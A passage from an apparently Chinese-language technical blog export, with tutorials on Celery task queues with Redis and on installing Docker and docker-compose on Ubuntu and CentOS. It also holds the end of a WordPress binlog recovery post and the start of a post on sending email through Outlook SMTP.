<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;log_bin&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>再看看配置是否正确, <code>binlog_format=ROW</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;binlog%&quot;;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>很好, 前提条件都具备了, 那么导出执行查询语句的那一段时间的日志</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysqlbinlog &lt;log_path&gt;/mysql-bin.000087 --start-datetime=<span class="string">&#x27;2022-05-17 15:00:00&#x27;</span> --stop-datetime=<span class="string">&#x27;2022-05-17 16:00:00&#x27;</span> &gt; ~/mysql-bin.sql</span><br></pre></td></tr></table></figure>

<p>接下来, 写一段Python脚本, 生成回滚SQL, 顺便把恶意代码也清了, 最终, 问题解决~</p>
<blockquote>
<p>最后, 数据无价, 操作需谨慎( •̀ .̫ •́ )</p>
</blockquote>
]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>WordPress</tag>
      </tags>
  </entry>
  <entry>
    <title>Celery 快速上手指南-Python篇</title>
    <url>/73d2d4df/</url>
    <content><![CDATA[<blockquote>
<p>Github -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NlbGVyeS9jZWxlcnk=">https://github.com/celery/celery</span><br>Docs   -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS9pbmRleC5odG1s">https://docs.celeryq.dev/en/stable/index.html</span></p>
</blockquote>
<h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><ul>
<li>Celery 是一个异步任务队列, 用于分布式调度任务</li>
<li>组件<ul>
<li>Celery Beat 任务调度器<br>用于发布任务到任务队列</li>
<li>Celery Workers 执行任务的消费者<br>默认情况下 Celery 会在不同进程执行任务, 可以分布到多台机器</li>
<li>Broker 消息代理<br>用来传递任务的, 通常搭配 <code>RabbitMQ</code> or <code>Redis</code> 使用</li>
<li>Producer 任务生产者<br>调用Celery提供的API进行任务添加</li>
<li>Result Backend 结果后端<br>保存了任务结果以供查询</li>
</ul>
</li>
</ul>
<p><img data-src="http://img.owq.world/2022/05/1540-a7efa3.png"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -U Celery</span><br></pre></td></tr></table></figure>

<p>这里用 <code>Redis</code> 作为传递消息队列和后端, 可以直接安装捆绑包.</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -U <span class="string">&quot;celery[redis]&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>创建文件 <code>dome.py</code> 和 <code>test.py</code></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── dome.<span class="keyword">py</span></span><br><span class="line">└── test.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p><strong>dome.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis://:password@hostname:port/db_number</span></span><br><span class="line">broker = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span>		<span class="comment"># 任务队列</span></span><br><span class="line">backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span>	<span class="comment"># 后端(存储任务结果)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个参数是生成任务名的前缀, 不影响后续操作</span></span><br><span class="line"><span class="comment"># result_expires 参数是后端结果保存时间</span></span><br><span class="line">app = Celery(<span class="string">&#x27;test&#x27;</span>, broker=broker, backend=backend, result_expires=<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task	</span><span class="comment"># 装饰add函数成为 Task 实例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br></pre></td></tr></table></figure>

<h2 id="运行Celery"><a href="#运行Celery" class="headerlink" title="运行Celery"></a>运行Celery</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">celery -A dome worker -l info -c 8</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-A</code>: 指定创建的celery对象的位置<br><code>dome</code>里有初始化后的实例, <code>worker</code>表示该实例是任务执行者</li>
<li><code>-l</code>: 输出的日志等级</li>
<li><code>-c</code>: 运行的worker数量(并发), 默认和CPU核心数一样</li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><blockquote>
<p>任务调用 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS91c2VyZ3VpZGUvY2FsbGluZy5odG1s">https://docs.celeryq.dev/en/stable/userguide/calling.html</span></p>
</blockquote>
<p>进入<code>pyhton</code>交互模式或编写<code>test.py</code>测试文件测试都可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dome</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>delay()</code>: 用于异步调用任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回的是 AsyncResult 实例</span></span><br><span class="line">dome.add.delay(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>apply_async()</code>: 和<code>delay()</code>作用一样, 但支持更多操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dome.add.apply_async(args=[<span class="number">1</span>,<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
</li>
<li><p>s()</p>
</li>
<li><p><code>ready()</code>: 返回任务完成状态</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result.ready()</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>get()</code>: 获取任务结果(执行过程是阻塞的)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置超时, 超时未完成抛出 TimeoutError</span></span><br><span class="line">result.get(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略异常</span></span><br><span class="line">result.get(propagate=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>traceback</code>: 获取异常, 无异常为<code>None</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result.traceback</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>这里添加下100个任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[dome.wait.delay(<span class="number">60</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br></pre></td></tr></table></figure>

<p>这时<code>Redis</code>会存在3个键, 实际上执行<code>dome.add.delay(1,2)</code>也有, 但任务已经被取走执行了, 观察不到过程.</p>
<ul>
<li><code>celery</code>: 里面存放的是待执行的任务队列</li>
<li><code>unacked</code>: 里面是存放的待确认的任务队列(已被分配给<code>Workers</code>的任务)<br>unacked 表示为未收到ack(确认讯息)</li>
<li><code>unacked_index</code>: 优先队列, 存放的是<code>unacked</code>相应的索引</li>
</ul>
<p>任务在生成时会被添加到任务队列里, 这时任务调度器没有运行的话, 你会看到100个任务在<strong>任务队列</strong>安安静静的躺着.</p>
<p>因为电脑CPU有16核, 默认会创建16个<code>worker</code>, 在添加完任务后的60秒内, <code>unacked</code>里面应该是存在着64条待确认任务(每个<code>worker</code>分配5条), 而任务队列里面有20条待执行任务, 剩下的16条在<code>worker</code>中执行.</p>
<p>任务执行完, <code>worker</code>会拿<code>unacked</code>里的任务执行, 任务队列里会继续把任务分配给有空闲的<code>worker</code>, 直到任务都执行完.</p>
<p>如果强行中断程序的话, <code>unacked</code>里的任务会重新被塞回任务队列里面, 而<strong>正在执行中任务则会被丢失</strong>, 这是极不推荐的做法, 正确的做法是给<code>celery</code>进程发送<code>TERM</code>信号, 这样<code>woeker</code>会等待任务完成后再关闭.</p>
<h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="默认使用"><a href="#默认使用" class="headerlink" title="默认使用"></a>默认使用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul>
<li><strong>name</strong>: 可以显式指定任务的名字, 默认是模块的命名空间中本函数的名字</li>
<li><strong>serializer</strong>: 指定本任务的序列化的方法</li>
<li><strong>bind</strong>: 一个bool值, 设置是否绑定一个task的实例, 如果绑定, task实例会作为参数传递到任务方法中, 可以访问task实例的所有的属性, 即前面反序列化中那些属性</li>
<li><strong>base</strong>: 定义任务的基类, 可以以此来定义回调函数, 默认是Task类</li>
<li><strong>default_retry_delay</strong>: 设置该任务重试的延迟时间, 当任务执行失败后, 会自动重试, 单位是秒, 默认3分钟</li>
<li><strong>autoretry_for</strong>: 设置在特定异常时重试任务, 默认False即不重试</li>
<li><strong>retry_backoff</strong>: 默认False, 设置重试时的延迟时间间隔策略</li>
<li><strong>retry_backoff_max</strong>: 设置最大延迟重试时间, 默认10分钟, 如果失败则不再重试</li>
<li><strong>retry_jitter</strong>: 默认True, 即引入抖动, 避免重试任务集中执行</li>
</ul>
<h3 id="函数要求"><a href="#函数要求" class="headerlink" title="函数要求"></a>函数要求</h3><ul>
<li>方法应该是<strong>等幂的</strong><ul>
<li>默认情况下Celery不会执行任何重试逻辑</li>
<li>重试的话需要根据Celery说明配置</li>
</ul>
</li>
<li>涉及<code>I/O</code>的操作应该做好<strong>超时处理</strong></li>
</ul>
<h3 id="重试"><a href="#重试" class="headerlink" title="重试"></a>重试</h3><blockquote>
<p>错误重试最好不用加在Celery里面, 会使程序设计复杂, 耦合度升高</p>
</blockquote>
<figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">...</span></span><br></pre></td></tr></table></figure>

<h3 id="取消任务"><a href="#取消任务" class="headerlink" title="取消任务"></a>取消任务</h3><h4 id="revoke"><a href="#revoke" class="headerlink" title="revoke()"></a>revoke()</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = add.apply_async(args=[<span class="number">2</span>, <span class="number">2</span>], countdown=<span class="number">120</span>)</span><br><span class="line">result.revoke()</span><br></pre></td></tr></table></figure>

<p><strong>使用任务id取消</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> proj.celery <span class="keyword">import</span> app</span><br><span class="line">app.control.revoke(task_id)</span><br></pre></td></tr></table></figure>

<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><blockquote>
<p>crontab docs -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS9yZWZlcmVuY2UvY2VsZXJ5LnNjaGVkdWxlcy5odG1s">https://docs.celeryq.dev/en/stable/reference/celery.schedules.html</span></p>
</blockquote>
<h3 id="配置时区"><a href="#配置时区" class="headerlink" title="配置时区"></a>配置时区</h3><p><strong>timezone</strong>: 默认为UTC(version&gt;3.0)<br>值为<code>pytz</code>库支持的时区 -&gt; <code>pytz.common_timezones</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>enable_utc</strong>: 设置为 false 时，将使用系统本地时区.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">app.conf.enable_utc</span> = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="Dome"><a href="#Dome" class="headerlink" title="Dome"></a>Dome</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery  <span class="comment"># pip install -U Celery</span></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"></span><br><span class="line">broker = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span></span><br><span class="line">backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">&#x27;dome&#x27;</span>, broker=broker, backend=backend, result_expires=<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">app.conf.timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">app.conf.beat_schedule = &#123;</span><br><span class="line">    <span class="string">&#x27;add_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.add&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: <span class="number">3.0</span>,	<span class="comment"># 每3秒执行一次</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;wait_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.wait&#x27;</span>,		<span class="comment"># 注意模块名要一致</span></span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),  	<span class="comment"># 每分钟执行一次</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (randint(<span class="number">2</span>,<span class="number">20</span>),)	<span class="comment"># 注意参数是元组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>

<h3 id="运行celery"><a href="#运行celery" class="headerlink" title="运行celery"></a>运行celery</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">celery</span> -A dome worker -l <span class="literal">info</span></span><br></pre></td></tr></table></figure>

<p>加上 <code>-B</code> 会同时启动 定时任务</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">celery -<span class="selector-tag">A</span> dome worker -l info -<span class="selector-tag">B</span></span><br></pre></td></tr></table></figure>

<h3 id="启动定时任务"><a href="#启动定时任务" class="headerlink" title="启动定时任务"></a>启动定时任务</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">celery</span> -A dome beat -l <span class="literal">info</span></span><br></pre></td></tr></table></figure>

<h2 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h2><p>创建<code>config</code>文件夹, 然后创建 <code>celery.py</code>和<code>__init__.py</code>文件</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="keyword">conf</span></span><br><span class="line">│   ├── celery.<span class="keyword">py</span></span><br><span class="line">│   └── __init__.<span class="keyword">py</span></span><br><span class="line">├── dome.<span class="keyword">py</span></span><br><span class="line">└── test.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>修改<code>celery.py</code>, 把前面的配置转移进来</p>
<blockquote>
<p>配置文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNlbGVyeXEuZGV2L2VuL3N0YWJsZS91c2VyZ3VpZGUvY29uZmlndXJhdGlvbi5odG1s">https://docs.celeryq.dev/en/stable/userguide/configuration.html</span></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery.schedules <span class="keyword">import</span> crontab</span><br><span class="line"></span><br><span class="line">broker_url = <span class="string">&#x27;redis://localhost:6379/2&#x27;</span></span><br><span class="line">result_backend = <span class="string">&#x27;redis://localhost:6379/3&#x27;</span></span><br><span class="line"></span><br><span class="line">result_expires = <span class="number">120</span>    <span class="comment"># 结果存储时间</span></span><br><span class="line"></span><br><span class="line">retry_policy = <span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Worker接收超时, 超时没有确认时任务会被分配到另一个Worker</span></span><br><span class="line">broker_transport_options = &#123;<span class="string">&#x27;visibility_timeout&#x27;</span>: <span class="number">600</span>&#125;</span><br><span class="line"></span><br><span class="line">timezone = <span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line">beat_schedule = &#123;</span><br><span class="line">    <span class="string">&#x27;add_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.add&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: <span class="number">3.0</span>,	<span class="comment"># 每3秒执行一次</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;wait_schedule&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;dome.wait&#x27;</span>,		<span class="comment"># 注意模块名要一致</span></span><br><span class="line">        <span class="string">&#x27;schedule&#x27;</span>: crontab(),  	<span class="comment"># 每分钟执行一次</span></span><br><span class="line">        <span class="string">&#x27;args&#x27;</span>: (randint(<span class="number">2</span>,<span class="number">20</span>),)	<span class="comment"># 注意参数是元组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改<code>dome.py</code>, 使用 <code>config_from_object()</code> 加载配置文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">&#x27;dome&#x27;</span>)</span><br><span class="line">app.config_from_object(<span class="string">&#x27;conf.celery&#x27;</span>)  <span class="comment"># 导入配置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">wait</span>):</span><br><span class="line">    time.sleep(wait)</span><br><span class="line">    <span class="keyword">return</span> wait</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li><p>查看 Workers 状态</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">celery -A &lt;workers&gt; inspect active</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Celery</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 安装 Docker</title>
    <url>/bcd27009/</url>
    <content><![CDATA[<h2 id="Ubuntu-x2F-Debian"><a href="#Ubuntu-x2F-Debian" class="headerlink" title="Ubuntu&#x2F;Debian"></a>Ubuntu&#x2F;Debian</h2><blockquote>
<p>适用于 Ubuntu 21.04、21.10和 Debian 发行版</p>
<p>官方文档: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZGVza3RvcC9saW51eC8=">https://docs.docker.com/desktop/linux/</span></p>
</blockquote>
<h3 id="添加镜像源"><a href="#添加镜像源" class="headerlink" title="添加镜像源"></a>添加镜像源</h3><p>安装相关包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; \</span><br><span class="line">sudo apt-get install \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<p>添加官方 GPG 密钥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>

<p>设置镜像源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>运行<code>hello-world</code>镜像查看是否安装成功.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载相关包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt remove docker-desktop</span><br></pre></td></tr></table></figure>

<p>删除所有镜像, 容器, 卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r <span class="variable">$HOME</span>/.docker/desktop</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/local/bin/com.docker.cli</span><br><span class="line">sudo apt purge docker-desktop</span><br></pre></td></tr></table></figure>



<h2 id="CentOS7-x2F-8"><a href="#CentOS7-x2F-8" class="headerlink" title="CentOS7&#x2F;8"></a>CentOS7&#x2F;8</h2><blockquote>
<p>适用于 CentOS7&#x2F;8</p>
<p>官方文档: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvY2VudG9zLw==">https://docs.docker.com/engine/install/centos/</span></p>
</blockquote>
<h3 id="查看系统环境"><a href="#查看系统环境" class="headerlink" title="查看系统环境"></a>查看系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/redhat-release</span><br></pre></td></tr></table></figure>

<h3 id="添加镜像源-1"><a href="#添加镜像源-1" class="headerlink" title="添加镜像源"></a>添加镜像源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils <span class="comment"># yum命令增强工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据所处网络选其一即可</span></span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里源</span></span><br><span class="line">sudo yum-config-manager --add-repo  http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装过程中提示&quot;接受 GPG 密钥&quot;的话，验证指纹是否与<code>060a 61c51b558a7f 742B 77AA C52F EB6B 621E 9f35</code>匹配，如果是，接受它.</p>
</blockquote>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>

<h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><p>运行<code>hello-world</code>镜像查看是否安装成功.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<h3 id="卸载-1"><a href="#卸载-1" class="headerlink" title="卸载"></a>卸载</h3><p>卸载相关包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>删除所有镜像, 容器, 卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvY2tlci9jb21wb3Nl">docker&#x2F;compose: Define and run multi-container applications with Docker (github.com)</span></p>
</blockquote>
<h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>安装的是2.5.0版本, 新版可以去项目仓库获取.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/v2.5.0/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="赋权"><a href="#赋权" class="headerlink" title="赋权"></a>赋权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="链接到PATH"><a href="#链接到PATH" class="headerlink" title="链接到PATH"></a>链接到PATH</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h3 id="卸载-2"><a href="#卸载-2" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 优雅的群发邮件</title>
    <url>/9f9b4f64/</url>
    <content><![CDATA[<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><blockquote>
<p>邮箱需要开启<strong>SMTP功能</strong></p>
</blockquote>
<h3 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h3><ul>
<li><p><strong>SMTP</strong>(Simple Mail Transfer Protocol)<br>简单邮件传输协议, 是电子邮件发送的行业标准协议.(发送用)</p>
</li>
<li><p><strong>IMAP</strong>(Internet Access Message Protocol)<br>处理从接收服务器管理和检索电子邮件消息的电子邮件协议.（接受用)<br><strong>可以跨所有设备同步消息</strong>.</p>
</li>
<li><p><strong>POP3</strong><br>POP(邮局协议), 3(版本号), 也是接受用的协议.<br>和<code>IMAP</code>主要区别在, <code>POP3</code>会保存文件到本地, 服务器删了也没事, 便于脱机.</p>
</li>
</ul>
<h3 id="开启SMTP"><a href="#开启SMTP" class="headerlink" title="开启SMTP"></a>开启SMTP</h3><p>以 <strong>outlook</strong> 邮箱为例:</p>
<ul>
<li><p>登录网页版邮箱 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9vdXRsb29rLmNvbS8=">https://outlook.com</span></p>
</li>
<li><p>右上角打开<code>设置</code>-搜索<code>IMAP</code>-打开<code>POP和IMAP</code>设置</p>
<p><img data-src="http://img.owq.world/2022/04/2141-ca5732.png"></p>
</li>
<li><p>默认是开启<code>SMTP </code>服务的<br><img data-src="http://img.owq.world/2022/05/2055-d813fd.png"></p>
</li>
<li><p>记录下 <code>SMTP</code> 配置</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">服务器名称: smtp.office365.com</span></span><br><span class="line"><span class="section">端口: 587</span></span><br><span class="line"><span class="section">加密方法: STARTTLS</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>注: 其它类型的邮箱大多需要获取<strong>授权码</strong>才能登录邮箱, 而<code>outlook</code>用账号密码就可以.</em></p>
